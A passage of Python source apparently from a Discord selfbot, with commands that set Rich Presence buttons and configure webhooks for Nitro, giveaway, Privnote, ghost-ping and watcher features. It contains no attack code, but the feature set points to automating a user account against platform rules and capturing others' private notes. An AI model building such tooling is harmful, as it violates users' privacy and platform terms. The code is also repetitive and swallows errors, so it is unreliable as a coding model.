            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass

    @React.command(usage="rpcbtnoneurl <URL>", description="Sets the button one URL")
    async def rpcbtnoneurl(ctx, *, url: str):
        try:


            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence button one URL set to **{url}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC button one URL URL set to {url}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['buttons']['button_one_url'] = url
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass

    @React.command(usage="rpcbtntwolabel <Label>", description="Sets the button two label")
    async def rpcbtntwolabel(ctx, *, label: str):
        try:

            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence button two label set to **{label}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC button two label set to {label}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['buttons']['button_two_label'] = label
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass

    @React.command(usage="rpcbtntwourl <URL>", description="Sets the button two URL")
    async def rpcbtntwourl(ctx, *, url: str):
        try:

            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence button two URL set to **{url}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC button two URL URL set to {url}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['buttons']['button_two_url'] = url
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except RuntimeWarning:
            pass

    @React.command(usage="rpcupdate", description="Restarts the bot to apply some rich presence features")
    async def rpcupdate(ctx):
        await ctx.message.delete()
        python = sys.executable
        os.execl(python, python, *sys.argv)


    @React.command(usage="wall <URL>", description="Sets the webhook URL for everything")
    async def wall(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['nitro_webhook_url'] = url
        nitro_webhook_url = url
        data['giveaways_webhook_url'] = url
        giveaways_webhook_url = url
        data['ghostping_detection_webhook'] = url
        ghostping_detection_webhook = url
        data['privnote_webhook_url'] = url
        privnote_webhook_url = url
        data['command_usage_webhook'] = url
        command_usage_webhook = url
        data['dm_delete_notify_webhook_url'] = url
        dm_delete_notify_webhook_url = url
        data['selfbot_detection_webhook'] = url
        selfbot_detection_webhook = url
        data['server_ban_webhook'] = url
        data['ticket_webhook_url'] = url
        data['relationship_webhook_url'] = url
        data['nickname_update_webhook'] = url
        data['watcher_webhook_url'] = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'All Webhooks', description='All Webhooks URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'All Webhooks URL set.'
            await ctx.send(msg)

    @React.command(usage="wnitro <URL>", description="Set Nitro webhook URL")
    async def wnitro(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['nitro_webhook_url'] = url
        nitro_webhook_url = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Webhook', description='Nitro Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Nitro Webhook URL set.'
            await ctx.send(msg)

    @React.command(usage="wtickets <URL>", description="Set Tickets detection webhook URL")
    async def wtickets(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['ticket_webhook_url'] = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ticket Webhook', description='Ticket Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Ticket Webhook URL set.'
            await ctx.send(msg)

    @React.command(usage="wrelationships <URL>", description="Set Relationship updates webhook URL")
    async def wrelationships(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['relationship_webhook_url'] = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Relationship Webhook', description='Relationship updates Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Relationship updates Webhook URL set.'
            await ctx.send(msg)
            
    @React.command(usage="streamingurl <URL>", description="Sets the URL for the streaming command")
    async def streamingurl(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['stream_url'] = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Streaming URL', description='Streaming URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Streaming URL set.'
            await ctx.send(msg)
            
    @React.command(usage="wserverban <URL>", description="Set Server Bans webhook URL")
    async def wserverban(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['server_ban_webhook'] = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Ban Webhook', description='Server Ban Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Server Ban Webhook URL set.'
            await ctx.send(msg)
            
    @React.command(usage="wgiveaways <URL>", description="Set giveaways webhook URL")
    async def wgiveaways(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['giveaways_webhook_url'] = url
        giveaways_webhook_url = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaways Webhook', description='Giveaways Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Giveaways Webhook URL set.'
            await ctx.send(msg)

    @React.command(usage="wnickname <URL>", description="Set Nickname updates webhook URL")
    async def wnickname(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['nickname_update_webhook'] = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nickname Webhook', description='Nickname updates Webhook URL set.',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)
            
    @React.command(usage="wgpings <URL>", description="Set Ghostpings webhook URL")
    async def wgpings(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['ghostping_detection_webhook'] = url
        ghostping_detection_webhook = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ghostpings Webhook', description='Ghostpings Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Ghostpings Webhook URL set.'
            await ctx.send(msg)

    @React.command(usage="wroleupdates <URL>", description="Set Role updates webhook URL")
    async def wroleupdates(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['role_update_webhook'] = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Role Update Webhook', description='Role updates Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Role Updates Webhook URL set.'
            await ctx.send(msg)
            
    @React.command(usage="wprivnotes <URL>", description="Set Privnotes webhook URL")
    async def wprivnotes(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['privnote_webhook_url'] = url
        privnote_webhook_url = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Privnote Webhook', description='Privnote Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Privnote Webhook URL set.'
            await ctx.send(msg)
            
    @React.command(usage="wcmds <URL>", description="Set Command usage webhook URL")
    async def wcmds(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['command_usage_webhook'] = url
        command_usage_webhook = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Command Usage Webhook', description='Command Usage Webhook URL set.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            msg = 'Command Usage Webhook URL set.'
            await ctx.send(msg)
            
    @React.command(usage="wwatcher <URL>", description="Set Watcher webhook URL")
    async def wwatcher(ctx, url):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data['watcher_webhook_url'] = url
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
        set_vars()
            
        if True:
